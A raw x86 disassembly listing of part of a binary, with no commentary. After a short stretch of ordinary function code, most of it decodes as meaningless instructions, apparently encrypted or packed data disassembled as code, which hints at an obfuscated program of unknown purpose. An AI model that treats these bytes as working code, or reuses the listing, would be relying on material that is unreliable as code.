  4168be:	push   DWORD PTR [ebp-0x6c]
  4168c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4168c4:	push   ecx
  4168c5:	jmp    ecx
  4168c7:	jmp    0x4168cf
  4168c9:	mov    ecx,DWORD PTR [ebp+0x8]
  4168cc:	mov    DWORD PTR [ebp-0x18],ecx
  4168cf:	mov    eax,0x1
  4168d4:	pop    ebx
  4168d5:	mov    esp,ebp
  4168d7:	pop    ebp
  4168d8:	ret    
  4168d9:	push   ebp
  4168da:	mov    ebp,esp
  4168dc:	pop    ebp
  4168dd:	ret    
  4168de:	push   ebp
  4168df:	mov    ebp,esp
  4168e1:	sub    esp,0x54
  4168e4:	mov    DWORD PTR [ebp-0x34],0x0
  4168eb:	mov    DWORD PTR [ebp-0x4],0x0
  4168f2:	mov    DWORD PTR [ebp-0x50],0x0
  4168f9:	mov    DWORD PTR [ebp-0x4c],0x0
  416900:	mov    DWORD PTR [ebp-0x30],0x0
  416907:	lea    eax,[ebp-0x38]
  41690a:	push   eax
  41690b:	push   0x8
  41690d:	call   DWORD PTR ds:0x418020
  416913:	call   DWORD PTR ds:0x418014
  416919:	mov    DWORD PTR [ebp-0x30],eax
  41691c:	lea    ecx,[ebp-0x48]
  41691f:	push   ecx
  416920:	call   DWORD PTR ds:0x418010
  416926:	mov    edx,DWORD PTR [ebp-0x34]
  416929:	push   edx
  41692a:	call   0x416959
  41692f:	add    esp,0x4
  416932:	call   0x417e25
  416937:	mov    DWORD PTR [ebp-0x54],0x0
  41693e:	jmp    0x416949
  416940:	mov    eax,DWORD PTR [ebp-0x54]
  416943:	add    eax,0x1
  416946:	mov    DWORD PTR [ebp-0x54],eax
  416949:	cmp    DWORD PTR [ebp-0x54],0x64
  41694d:	jae    0x416951
  41694f:	jmp    0x416940
  416951:	xor    eax,eax
  416953:	mov    esp,ebp
  416955:	pop    ebp
  416956:	ret    0x10
  416959:	push   ebp
  41695a:	mov    ebp,esp
  41695c:	sub    esp,0x40
  41695f:	push   esi
  416960:	mov    DWORD PTR [ebp-0x40],0x0
  416967:	mov    DWORD PTR [ebp-0x3c],0x0
  41696e:	mov    DWORD PTR [ebp-0x34],0x0
  416975:	mov    DWORD PTR [ebp-0x28],0x0
  41697c:	mov    DWORD PTR [ebp-0x20],0x0
  416983:	mov    DWORD PTR [ebp-0x2c],0x0
  41698a:	mov    DWORD PTR [ebp-0x30],0x449e28
  416991:	mov    DWORD PTR [ebp-0x28],0x6ecd64ac
  416998:	mov    DWORD PTR [ebp-0x38],0x0
  41699f:	mov    eax,DWORD PTR [ebp-0x28]
  4169a2:	mov    DWORD PTR [ebp-0x24],eax
  4169a5:	mov    DWORD PTR [ebp-0x4],0x0
  4169ac:	mov    ecx,DWORD PTR ds:0x418014
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	push   0x0
  4169b7:	push   0x4e
  4169b9:	push   0x1e
  4169bb:	push   0x0
  4169bd:	push   0xffffffff
  4169bf:	call   DWORD PTR ds:0x41801c
  4169c5:	test   eax,eax
  4169c7:	je     0x417e04
  4169cd:	and    al,0xb1
  4169cf:	test   al,0x27
  4169d1:	sbb    eax,DWORD PTR [edi-0x740ab77f]
  4169d7:	outs   dx,BYTE PTR ds:[esi]
  4169d8:	and    ebx,edx
  4169da:	xchg   esi,eax
  4169db:	jmp    0x416a15
  4169dd:	lahf   
  4169de:	sbb    BYTE PTR [edi-0x740eb77f],al
  4169e4:	outs   dx,BYTE PTR ds:[esi]
  4169e5:	popa   
  4169e6:	sub    al,0x69
  4169e8:	jmp    0x416a22
  4169ea:	daa    
  4169eb:	sbb    BYTE PTR [edi-0x740eb77f],al
  4169f1:	outs   dx,BYTE PTR ds:[esi]
  4169f2:	and    DWORD PTR [ecx+ebp*2],ebp
  4169f5:	jmp    0x416a2f
  4169f7:	daa    
  4169f8:	sbb    BYTE PTR [edi-0x740eb77f],al
  4169fe:	outs   dx,BYTE PTR ds:[esi]
  4169ff:	and    DWORD PTR [ecx+ebp*2],ebp
  416a02:	jmp    0x416a3c
  416a04:	daa    
  416a05:	sbb    BYTE PTR [edi-0x7506b77f],al
  416a0b:	outs   dx,BYTE PTR ds:[esi]
  416a0c:	and    DWORD PTR [edx],esp
  416a0e:	jbe    0x416a61
  416a10:	ss daa 
  416a12:	lods   al,BYTE PTR ds:[esi]
  416a13:	mov    cs,WORD PTR [ecx+ebp*2+0x49]
  416a17:	mov    ah,BYTE PTR [edx]
  416a19:	in     al,dx
  416a1a:	or     eax,0x5451833d
  416a1f:	cmp    bh,dh
  416a21:	repz daa 
  416a23:	xchg   esi,eax
  416a24:	stc    
  416a25:	cmovl  ecx,DWORD PTR [edx+ecx*1]
  416a29:	mov    dl,BYTE PTR [esi+0x49]
  416a2c:	ja     0x416a21
  416a2e:	mov    eax,ds:0x1cab942a
  416a33:	push   esp
  416a34:	inc    edx
  416a35:	dec    ecx
  416a36:	adc    BYTE PTR [esi+0x7],0x5c
  416a3a:	enter  0x68d2,0x9c
  416a3e:	in     al,0xa
  416a40:	inc    esp
  416a41:	add    ah,BYTE PTR [esi+eiz*8+0x32]
  416a45:	add    ebx,DWORD PTR [eax]
  416a47:	xchg   DWORD PTR [ecx+0x6e8bf148],eax
  416a4d:	pop    ebx
  416a4e:	jecxz  0x416acf
  416a50:	gs push es
  416a52:	mov    DWORD PTR [eax+0x5a],esp
  416a55:	mov    edi,0x505689e6
  416a5a:	(bad)  
  416a5b:	push   esp
  416a5c:	mov    ah,0xce
  416a5e:	or     eax,ecx
  416a60:	lds    esp,FWORD PTR [ebp-0x51d3cfd1]
  416a66:	pop    ebp
  416a67:	repz icebp 
  416a69:	(bad)  
  416a6a:	inc    ebp
  416a6b:	inc    eax
  416a6c:	cli    
  416a6d:	cmp    eax,0xe49552b4
  416a72:	and    eax,0xb17dfc16
  416a77:	cmp    ch,ah
  416a79:	sbb    al,0xb6
  416a7b:	call   FWORD PTR [edi+edi*2+0x27]
  416a7f:	jo     0x416a34
  416a81:	push   ss
  416a82:	adc    BYTE PTR [ecx],0x36
  416a85:	psllw  mm6,mm3
  416a88:	pop    edx
  416a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8a:	out    0x89,al
  416a8c:	push   esi
  416a8d:	push   eax
  416a8e:	(bad)  
  416a8f:	push   ebp
  416a90:	mov    ah,0xa2
  416a92:	xchg   edi,eax
  416a93:	pop    edi
  416a94:	lds    eax,FWORD PTR [ebp+0xf]
  416a97:	and    ch,BYTE PTR [ebx+edi*4]
  416a9a:	rcr    BYTE PTR [ecx-0xf],0x4c
  416a9e:	fsubr  st,st(7)
  416aa0:	cli    
  416aa1:	popa   
  416aa2:	sub    ecx,edi
  416aa4:	xchg   ebp,eax
  416aa5:	aam    0xb8
  416aa7:	mov    esp,?
  416aa9:	adc    eax,edi
  416aab:	xchg   ebx,eax
  416aac:	in     eax,0x2
  416aae:	sub    esp,DWORD PTR [edx+0x5c]
  416ab1:	ja     0x416b12
  416ab3:	repz mov bl,0x73
  416ab6:	inc    ebp
  416ab7:	or     al,BYTE PTR [ebx+0x5a608906]
  416abd:	or     DWORD PTR [eax-0xf],0x2c216e8b
  416ac4:	imul   ebp,ebx,0x87182738
  416aca:	or     DWORD PTR [eax-0xf],0x2c216e8b
  416ad1:	imul   ebp,ebx,0xc2482738
  416ad7:	or     DWORD PTR [eax-0x43],0x4a216d8a
  416ade:	daa    
  416adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ae0:	ja     0x416b09
  416ae2:	sbb    BYTE PTR [edi-0x740eb77f],al
  416ae8:	outs   dx,BYTE PTR ds:[esi]
  416ae9:	shr    DWORD PTR [ebx+ebp*2],0xea
  416aed:	xor    esp,DWORD PTR [esi]
  416aef:	adc    al,BYTE PTR [edi-0x740a557f]
  416af5:	outs   dx,BYTE PTR ds:[esi]
  416af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416af7:	sub    ch,BYTE PTR [ecx-0x15]
  416afa:	cmp    BYTE PTR [edi],ah
  416afc:	sbb    ah,al
  416afe:	cmp    al,0x48
  416b00:	icebp  
  416b01:	mov    edi,DWORD PTR [esi+0x21]
  416b04:	sub    al,0x69
  416b06:	jmp    0x416b45
  416b08:	daa    
  416b09:	sbb    BYTE PTR [edi-0x640eb73f],al
  416b0f:	outs   dx,BYTE PTR ds:[esi]
  416b10:	and    DWORD PTR [ebx+ebp*2],ebp
  416b13:	jmp    0x416b4d
  416b15:	and    bl,BYTE PTR [eax]
  416b17:	xchg   BYTE PTR [ecx+0x6e8bf148],al
  416b1d:	and    al,0x2c
  416b1f:	push   0x182738eb
  416b24:	xchg   DWORD PTR [ecx+0x6e8bfd78],eax
  416b2a:	and    eax,0xc6e1692c
  416b2f:	and    ebx,DWORD PTR [eax]
  416b31:	test   DWORD PTR [ecx+0x6e8b7008],eax
  416b37:	xor    DWORD PTR [ecx+ebp*2],ebp
  416b3a:	sti    
  416b3b:	cmp    BYTE PTR [edi],ah
  416b3d:	sbb    BYTE PTR [edi-0x640eb76f],al
  416b43:	outs   dx,BYTE PTR ds:[esi]
  416b44:	and    DWORD PTR [ecx+ebp*2],ebp
  416b47:	jmp    0x416b81
  416b49:	aaa    
  416b4a:	sbb    BYTE PTR [edi-0x740eb77f],al
  416b50:	outs   dx,BYTE PTR ds:[esi]
  416b51:	and    DWORD PTR [ecx+ebp*2],ebp
  416b54:	jmp    0x416b92
  416b56:	daa    
  416b57:	adc    al,0x87
  416b59:	fmul   DWORD PTR [ebx-0xf]
  416b5c:	mov    ebp,DWORD PTR [esi-0x1f]
  416b5f:	daa    
  416b60:	imul   edi,DWORD PTR [esi-0x78e7d8f9],0x8bf14881
  416b6a:	outs   dx,BYTE PTR ds:[esi]
  416b6b:	and    DWORD PTR [ecx+ebp*2],ebp
  416b6e:	jmp    0x416ba8
  416b70:	daa    
  416b71:	sbb    BYTE PTR [edi-0x540eb77f],al
  416b77:	bound  esp,QWORD PTR [ecx]
  416b79:	xor    al,0x69
  416b7b:	jmp    0x416bb5
  416b7d:	daa    
  416b7e:	sbb    BYTE PTR [edi-0x740eb77f],al
  416b84:	outs   dx,BYTE PTR ds:[esi]
  416b85:	and    DWORD PTR [ecx+ebp*2],ebp
  416b88:	jmp    0x416bc2
  416b8a:	daa    
  416b8b:	sbb    BYTE PTR [edi-0x740eb77f],al
  416b91:	outs   dx,BYTE PTR ds:[esi]
  416b92:	and    DWORD PTR [ecx+ebp*2],ebp
  416b95:	jmp    0x416bcf
  416b97:	daa    
  416b98:	sbb    BYTE PTR [edi-0x740eb77f],al
  416b9e:	outs   dx,BYTE PTR ds:[esi]
  416b9f:	and    DWORD PTR [ecx+ebp*2],ebp
  416ba2:	jmp    0x416bdc
  416ba4:	daa    
  416ba5:	sbb    BYTE PTR [edi-0x740eb77f],al
  416bab:	outs   dx,BYTE PTR ds:[esi]
  416bac:	and    DWORD PTR [ecx+ebp*2],ebp
  416baf:	jmp    0x416be9
  416bb1:	daa    
  416bb2:	sbb    BYTE PTR [edi-0x740eb77f],al
  416bb8:	outs   dx,BYTE PTR ds:[esi]
  416bb9:	and    DWORD PTR [ecx+ebp*2],ebp
  416bbc:	jmp    0x416bf6
  416bbe:	daa    
  416bbf:	sbb    BYTE PTR [edi-0x740eb77f],al
  416bc5:	outs   dx,BYTE PTR ds:[esi]
  416bc6:	and    DWORD PTR [ecx+ebp*2],ebp
  416bc9:	jmp    0x416c03
  416bcb:	daa    
  416bcc:	sbb    BYTE PTR [ecx-0x76d20b],ch
  416bd2:	outs   dx,BYTE PTR ds:[esi]
  416bd3:	and    DWORD PTR [ecx+ebp*2],ebp
  416bd6:	pop    ebx
  416bd7:	xor    esp,DWORD PTR [edi]
  416bd9:	sbb    BYTE PTR [edi-0x120eb77f],dl
  416bdf:	push   0x21
  416be1:	sub    al,0x6d
  416be3:	jmp    0x416c1d
  416be5:	ja     0x416c44
  416be7:	les    esi,FWORD PTR [ebx+0x6e8bbe1c]
  416bed:	and    DWORD PTR [ecx+ebp*2],ebp
  416bf0:	jmp    0x416c0a
  416bf2:	daa    
  416bf3:	sbb    BYTE PTR [edi-0x51],ah
  416bf6:	cmp    al,BYTE PTR [edx+0x2c210df9]
  416bfc:	imul   ebp,ebx,0x87182758
  416c02:	inc    ecx
  416c03:	inc    ebx
  416c04:	icebp  
  416c05:	mov    edi,DWORD PTR [ecx+eiz*1]
  416c08:	sub    al,0x69
  416c0a:	cmp    DWORD PTR [edi+eiz*1],0x48818718
  416c11:	icebp  
  416c12:	mov    ebp,DWORD PTR [esi+0x21]
  416c15:	sub    al,0x69
  416c17:	jmp    0x416c51
  416c19:	pop    es
  416c1a:	sbb    BYTE PTR [edi-0x117c999f],al
  416c20:	add    cl,BYTE PTR [esi+0x4f]
  416c23:	imul   ebp,ebx,0x87182538
  416c29:	sub    DWORD PTR [eax-0x3],0x2c236e8b
  416c30:	imul   ebp,ebx,0x87182384
  416c36:	or     DWORD PTR [eax-0xf],0x2c216e8b
  416c3d:	imul   ebp,ebx,0x87582738
  416c43:	or     DWORD PTR [eax+0x216e8bf1],0x38eb692c
  416c4d:	daa    
  416c4e:	sbb    BYTE PTR [edi-0x740eb77f],al
  416c54:	outs   dx,BYTE PTR ds:[esi]
  416c55:	and    DWORD PTR [ecx+ebp*2],ebp
  416c58:	jmp    0x416c92
  416c5a:	daa    
  416c5b:	sbb    BYTE PTR [edi-0x740eb77f],al
  416c61:	outs   dx,BYTE PTR ds:[esi]
  416c62:	and    DWORD PTR [ecx+ebp*2],ebp
  416c65:	jmp    0x416c9f
  416c67:	daa    
  416c68:	sbb    BYTE PTR [edi-0x740eb77f],al
  416c6e:	outs   dx,BYTE PTR ds:[esi]
  416c6f:	and    DWORD PTR [ecx+ebp*2],ebp
  416c72:	jmp    0x416cac
  416c74:	daa    
  416c75:	sbb    BYTE PTR [edi-0x740eb77f],al
  416c7b:	outs   dx,BYTE PTR ds:[esi]
  416c7c:	and    DWORD PTR [ecx+ebp*2],ebp
  416c7f:	jmp    0x416cb9
  416c81:	daa    
  416c82:	sbb    BYTE PTR [edi-0x740eb77f],al
  416c88:	outs   dx,BYTE PTR ds:[esi]
  416c89:	and    DWORD PTR [ecx+ebp*2],ebp
  416c8c:	jmp    0x416cc6
  416c8e:	daa    
  416c8f:	sbb    BYTE PTR [edi-0x740eb77f],al
  416c95:	outs   dx,BYTE PTR ds:[esi]
  416c96:	and    DWORD PTR [ecx+ebp*2],ebp
  416c99:	jmp    0x416cd3
  416c9b:	daa    
  416c9c:	sbb    BYTE PTR [edi-0x740eb77f],al
  416ca2:	outs   dx,BYTE PTR ds:[esi]
  416ca3:	and    DWORD PTR [ecx+ebp*2],ebp
  416ca6:	jmp    0x416ce0
  416ca8:	daa    
  416ca9:	sbb    BYTE PTR [edi-0x740eb77f],al
  416caf:	outs   dx,BYTE PTR ds:[esi]
  416cb0:	and    DWORD PTR [ecx+ebp*2],ebp
  416cb3:	jmp    0x416ced
  416cb5:	daa    
  416cb6:	sbb    BYTE PTR [edi-0x740eb77f],al
  416cbc:	outs   dx,BYTE PTR ds:[esi]
  416cbd:	and    DWORD PTR [ecx+ebp*2],ebp
  416cc0:	jmp    0x416cfa
  416cc2:	daa    
  416cc3:	sbb    BYTE PTR [edi-0x740eb77f],al
  416cc9:	outs   dx,BYTE PTR ds:[esi]
  416cca:	and    DWORD PTR [ecx+ebp*2],ebp
  416ccd:	jmp    0x416d07
  416ccf:	daa    
  416cd0:	sbb    BYTE PTR [edi-0x740eb77f],al
  416cd6:	outs   dx,BYTE PTR ds:[esi]
  416cd7:	and    DWORD PTR [ecx+ebp*2],ebp
  416cda:	jmp    0x416d14
  416cdc:	daa    
  416cdd:	sbb    BYTE PTR [edi-0x740eb77f],al
  416ce3:	outs   dx,BYTE PTR ds:[esi]
  416ce4:	and    DWORD PTR [ecx+ebp*2],ebp
  416ce7:	jmp    0x416d21
  416ce9:	daa    
  416cea:	sbb    BYTE PTR [edi-0x740eb77f],al
  416cf0:	outs   dx,BYTE PTR ds:[esi]
  416cf1:	and    DWORD PTR [ecx+ebp*2],ebp
  416cf4:	jmp    0x416d2e
  416cf6:	daa    
  416cf7:	sbb    BYTE PTR [edi-0x740eb77f],al
  416cfd:	outs   dx,BYTE PTR ds:[esi]
  416cfe:	and    DWORD PTR [ecx+ebp*2],ebp
  416d01:	jmp    0x416d3b
  416d03:	daa    
  416d04:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d0a:	outs   dx,BYTE PTR ds:[esi]
  416d0b:	and    DWORD PTR [ecx+ebp*2],ebp
  416d0e:	jmp    0x416d48
  416d10:	daa    
  416d11:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d17:	outs   dx,BYTE PTR ds:[esi]
  416d18:	and    DWORD PTR [ecx+ebp*2],ebp
  416d1b:	jmp    0x416d55
  416d1d:	daa    
  416d1e:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d24:	outs   dx,BYTE PTR ds:[esi]
  416d25:	and    DWORD PTR [ecx+ebp*2],ebp
  416d28:	jmp    0x416d62
  416d2a:	daa    
  416d2b:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d31:	outs   dx,BYTE PTR ds:[esi]
  416d32:	and    DWORD PTR [ecx+ebp*2],ebp
  416d35:	jmp    0x416d6f
  416d37:	daa    
  416d38:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d3e:	outs   dx,BYTE PTR ds:[esi]
  416d3f:	and    DWORD PTR [ecx+ebp*2],ebp
  416d42:	jmp    0x416d7c
  416d44:	daa    
  416d45:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d4b:	outs   dx,BYTE PTR ds:[esi]
  416d4c:	and    DWORD PTR [ecx+ebp*2],ebp
  416d4f:	jmp    0x416d89
  416d51:	daa    
  416d52:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d58:	outs   dx,BYTE PTR ds:[esi]
  416d59:	and    DWORD PTR [ecx+ebp*2],ebp
  416d5c:	jmp    0x416d96
  416d5e:	daa    
  416d5f:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d65:	outs   dx,BYTE PTR ds:[esi]
  416d66:	and    DWORD PTR [ecx+ebp*2],ebp
  416d69:	jmp    0x416da3
  416d6b:	daa    
  416d6c:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d72:	outs   dx,BYTE PTR ds:[esi]
  416d73:	and    DWORD PTR [ecx+ebp*2],ebp
  416d76:	jmp    0x416db0
  416d78:	daa    
  416d79:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d7f:	outs   dx,BYTE PTR ds:[esi]
  416d80:	and    DWORD PTR [ecx+ebp*2],ebp
  416d83:	jmp    0x416dbd
  416d85:	daa    
  416d86:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d8c:	outs   dx,BYTE PTR ds:[esi]
  416d8d:	and    DWORD PTR [ecx+ebp*2],ebp
  416d90:	jmp    0x416dca
  416d92:	daa    
  416d93:	sbb    BYTE PTR [edi-0x740eb77f],al
  416d99:	outs   dx,BYTE PTR ds:[esi]
  416d9a:	and    DWORD PTR [ecx+ebp*2],ebp
  416d9d:	jmp    0x416dd7
  416d9f:	daa    
  416da0:	sbb    BYTE PTR [edi-0x740eb77f],al
  416da6:	outs   dx,BYTE PTR ds:[esi]
  416da7:	and    DWORD PTR [ecx+ebp*2],ebp
  416daa:	jmp    0x416de4
  416dac:	daa    
  416dad:	sbb    BYTE PTR [edi-0x740eb77f],al
  416db3:	outs   dx,BYTE PTR ds:[esi]
  416db4:	and    DWORD PTR [ecx+ebp*2],ebp
  416db7:	jmp    0x416df1
  416db9:	daa    
  416dba:	sbb    BYTE PTR [edi-0x740eb77f],al
  416dc0:	outs   dx,BYTE PTR ds:[esi]
  416dc1:	and    DWORD PTR [ecx+ebp*2],ebp
  416dc4:	jmp    0x416dfe
  416dc6:	daa    
  416dc7:	sbb    BYTE PTR [edi-0x740eb77f],al
  416dcd:	lds    ebp,FWORD PTR [edi+0x27]
  416dd0:	imul   eax,esp,0x87082738
  416dd6:	and    DWORD PTR [edx+0x53],0x639c1a51
  416ddd:	pop    edx
  416dde:	stc    
  416ddf:	adc    ebx,DWORD PTR [eiz*1-0x825cb98]
  416de6:	ret    0xd037
  416de9:	lock (bad) 
  416dec:	jg     0x416e0a
  416dee:	icebp  
  416def:	pop    edi
  416df0:	or     cl,BYTE PTR [edx]
  416df2:	or     BYTE PTR [ecx-0x6c],0x6e
  416df6:	mov    ebx,0x67ec3437
  416dfb:	jnp    0x416de7
  416dfd:	(bad)  
  416dff:	and    BYTE PTR [esi-0x165bd7d3],ch
  416e05:	cld    
  416e06:	lds    eax,FWORD PTR [edi]
  416e08:	and    DWORD PTR [edi-0x3342b53e],edi
  416e0e:	mov    dh,0xbd
  416e10:	sti    
  416e11:	es aad 0x8b
  416e14:	shr    esp,1
  416e16:	sahf   
  416e17:	xchg   esi,eax
  416e18:	push   es
  416e19:	add    cl,bl
  416e1b:	add    DWORD PTR [ebp-0x378b8635],edi
  416e21:	lea    esp,[edx]
  416e23:	sub    al,BYTE PTR [ebx+eax*1]
  416e26:	or     eax,0xdc78121
  416e2b:	(bad)  
  416e2c:	aaa    
  416e2d:	fnstcw WORD PTR [edi+edi*1-0x4eb34b2b]
  416e34:	jle    0x416e7e
  416e36:	inc    ebp
  416e37:	xchg   ecx,eax
  416e38:	xchg   BYTE PTR [esi+0x73af7200],dl
  416e3e:	std    
  416e3f:	sbb    ecx,ebp
  416e41:	xchg   ebx,eax
  416e42:	jnp    0x416e88
  416e44:	mov    fs,ebx
  416e46:	iret   
  416e47:	sbb    esi,DWORD PTR [ebp+0x33e31cfc]
  416e4d:	call   0x794767ba
  416e52:	stc    
  416e53:	inc    eax
  416e54:	retf   0x6aba
  416e57:	loope  0x416e00
  416e59:	push   ds
  416e5a:	outs   dx,DWORD PTR ds:[esi]
  416e5b:	psubq  mm4,QWORD PTR [esi-0x5b]
  416e5f:	nop
  416e60:	fild   WORD PTR [edi]
  416e62:	pop    es
  416e63:	xor    cl,0xad
  416e66:	pop    ebx
  416e67:	add    bl,BYTE PTR [ebx+ebx*2+0xf]
  416e6b:	ss das 
  416e6d:	leave  
  416e6e:	ret    
  416e6f:	jg     0x416e43
  416e71:	dec    esi
  416e72:	dec    esi
  416e73:	mov    ebx,0xf482455b
  416e78:	sbb    BYTE PTR ds:0x253af99f,dh
  416e7e:	inc    ebx
  416e7f:	stos   BYTE PTR es:[edi],al
  416e80:	loope  0x416e1b
  416e82:	aas    
  416e83:	xchg   BYTE PTR [esp+eiz*4+0x4b1b3cac],ch
  416e8a:	sub    BYTE PTR [eax],ah
  416e8c:	sub    DWORD PTR [ecx],edx
  416e8e:	push   edx
  416e8f:	ins    BYTE PTR es:[edi],dx
  416e90:	std    
  416e91:	int3   
  416e92:	pushf  
  416e93:	ss clc 
  416e95:	mov    bl,0xc
  416e97:	lds    ebp,FWORD PTR [edi]
  416e99:	pop    eax
  416e9a:	aas    
  416e9b:	cmp    bl,bl
  416e9d:	aam    0xb0
  416e9f:	sub    eax,0xa39888a1
  416ea4:	adc    eax,0xd34d73ec
  416ea9:	in     al,0x9a
  416eab:	mov    ebx,0xe1885ec7
  416eb0:	data16 icebp 
  416eb2:	punpckhwd mm0,QWORD PTR [ebp+ebx*2-0x4b50116c]
  416eba:	pop    ebx
  416ebc:	mov    esi,0xf0c125fb
  416ec1:	xchg   BYTE PTR [ebx+0x2c],cl
  416ec4:	add    eax,0xc68fe68d
  416ec9:	out    0x17,eax
  416ecb:	int3   
  416ecc:	mov    ds:0x111fe445,al
  416ed1:	nop
  416ed2:	into   
  416ed3:	sbb    esi,eax
  416ed5:	clc    
  416ed6:	cmp    ebp,ecx
  416ed8:	sbb    al,BYTE PTR [edi+0x24]
  416edb:	div    BYTE PTR [ebx]
  416edd:	outs   dx,BYTE PTR ds:[esi]
  416ede:	into   
  416edf:	and    esi,esp
  416ee1:	inc    ebx
  416ee2:	daa    
  416ee3:	sub    ebx,DWORD PTR [ecx]
  416ee5:	outs   dx,DWORD PTR ds:[esi]
  416ee6:	into   
  416ee7:	pop    ebx
  416ee8:	jecxz  0x416ea6
  416eea:	mov    esp,0xba929e03
  416eef:	xor    eax,0x8678f2ad
  416ef4:	js     0x416eb7
  416ef6:	xor    BYTE PTR [ebx-0x22],cl
  416ef9:	dec    eax
  416efa:	mov    DWORD PTR ds:0xc560e28f,esp
  416f00:	(bad)  
  416f01:	xlat   BYTE PTR ds:[ebx]
  416f02:	mov    esi,0xfd1d8d93
  416f07:	mov    esp,0xd6ca082d
  416f0c:	hlt    
  416f0d:	shl    edi,cl
  416f0f:	test   DWORD PTR [ebp+0x3a],ecx
  416f12:	mov    esi,0x667f3c56
  416f17:	jmp    0x416eb8
  416f19:	clc    
  416f1a:	mov    bl,0x1c
  416f1c:	add    esi,DWORD PTR [ebp+0x5b8f8549]
  416f22:	sbb    al,0x9
  416f24:	fstp   TBYTE PTR [edi-0x22]
  416f27:	pop    ecx
  416f28:	fldenv [edi+0x7c]
  416f2b:	add    eax,0xb1815450
  416f30:	jae    0x416ed4
  416f32:	jae    0x416f90
  416f34:	popa   
  416f35:	ins    DWORD PTR es:[edi],dx
  416f36:	cmp    al,0x7e
  416f38:	add    eax,0xf2654949
  416f3d:	cmp    esi,DWORD PTR [ebx-0x6ce1f98]
  416f43:	jne    0x416f13
  416f45:	sar    DWORD PTR [esi+0x5814b81],1
  416f4b:	push   0x5a
  416f4d:	push   ds
  416f4e:	imul   edx,eax,0xf55b133c
  416f54:	cld    
  416f55:	cmp    ah,dh
  416f57:	push   es
  416f58:	retf   0x5789
  416f5b:	jp     0x416f54
  416f5d:	test   DWORD PTR [edx],eax
  416f5f:	fistp  DWORD PTR [esi-0x8]
  416f62:	enter  0xc4a2,0xd4
  416f66:	mov    esi,0x9cfa61e7
  416f6b:	dec    ecx
  416f6c:	mov    BYTE PTR [ebx+ebp*8],ch
  416f6f:	push   edx
  416f70:	mov    eax,0xdfa3fba2
  416f75:	adc    eax,0x9275cf4c
  416f7a:	xor    al,BYTE PTR [ebp-0x7a]
  416f7d:	or     eax,0xdb95901a
  416f82:	stc    
  416f83:	add    dh,BYTE PTR [esi-0x20ccf6e5]
  416f89:	mov    ch,BYTE PTR [ebx+0x4f]
  416f8c:	pusha  
  416f8d:	push   edx
  416f8e:	cmp    BYTE PTR [edi-0x13595dac],al
  416f94:	jne    0x416fd5
  416f96:	pop    edx
  416f97:	fnsave [edx+eax*2-0x57a64b86]
  416f9e:	hlt    
  416f9f:	mov    dl,BYTE PTR es:[edi-0x9]
  416fa3:	ret    0xf029
  416fa6:	push   edi
  416fa7:	xor    ecx,esp
  416fa9:	jns    0x416f58
  416fab:	push   ds
  416fac:	bsf    esp,DWORD PTR [eax+0x29]
  416fb0:	mov    dl,0xf3
  416fb2:	xchg   ebx,eax
  416fb3:	sbb    al,0xa7
  416fb5:	sbb    bl,BYTE PTR [ecx-0x618a61b1]
  416fbb:	mov    ebx,0xf95e867a
  416fc0:	mul    DWORD PTR [eax]
  416fc2:	bound  ebp,QWORD PTR [ebp-0x7f]
  416fc5:	(bad)  
  416fc6:	fst    st(6)
  416fc8:	int    0x3f
  416fca:	or     edi,DWORD PTR [edx]
  416fcc:	jl     0x417012
  416fce:	mul    DWORD PTR [edx]
  416fd0:	clc    
  416fd1:	inc    esp
  416fd2:	mov    edx,0xe4fb3812
  416fd7:	or     eax,0xace21b3a
  416fdc:	cmc    
  416fdd:	data16 loope 0x416f97
  416fe0:	daa    
  416fe1:	push   esp
  416fe2:	imul   ebx,DWORD PTR [ebp-0x4c692e81],0x45
  416fe9:	and    dh,BYTE PTR [ebx+0x3e64f288]
  416fef:	mov    ebp,0x3cb029ab
  416ff4:	push   ebp
  416ff5:	cmp    al,0x43
  416ff7:	ins    DWORD PTR es:[edi],dx
  416ff8:	mov    gs,WORD PTR [edx+esi*4-0x3302b4cc]
  416fff:	clc    
  417000:	sub    al,dh
  417002:	addr16 pop ecx
  417004:	push   esp
  417005:	inc    ecx
  417006:	cmp    ebp,DWORD PTR [ebp-0x697782c8]
  41700c:	ret    
  41700d:	pop    ss
  41700e:	ret    
  41700f:	push   es
  417010:	mov    ds,WORD PTR [ecx-0x7f]
  417013:	aas    
  417014:	jb     0x416fc5
  417016:	addr16 enter 0x4269,0x4d
  41701b:	mov    edi,DWORD PTR [edi-0x2059e55d]
  417021:	cmp    al,0xe4
  417023:	(bad)  
  417024:	rcr    BYTE PTR [edi-0x74],cl
  417027:	add    bh,BYTE PTR [esi+0x57]
  41702a:	dec    edx
  41702b:	jno    0x417012
  41702d:	xchg   ecx,eax
  41702e:	test   DWORD PTR [ecx+0x274c0cad],edi
  417034:	(bad)  
  417035:	stos   DWORD PTR es:[edi],eax
  417036:	(bad)  
  417038:	ds cmp eax,0xf048455d
  41703e:	clc    
  41703f:	pop    edx
  417040:	frstor [ecx-0x3495e8ae]
  417046:	leave  
  417047:	stc    
  417048:	inc    esp
  417049:	push   cs
  41704a:	or     eax,0x7aab00e0
  41704f:	push   ebx
  417050:	sub    BYTE PTR [ebp+0x26],bh
  417053:	in     al,0xc
  417055:	lods   eax,DWORD PTR ds:[esi]
  417056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417057:	cs push esi
  417059:	dec    edi
  41705a:	push   edx
  41705b:	ins    BYTE PTR es:[edi],dx
  41705c:	sbb    cl,bh
  41705e:	mov    al,ds:0x51502f45
  417063:	out    0xba,eax
  417065:	iret   
  417066:	push   edi
  417067:	stos   DWORD PTR es:[edi],eax
  417068:	les    ecx,FWORD PTR [ebp-0xd]
  41706b:	out    dx,al
  41706c:	(bad)  
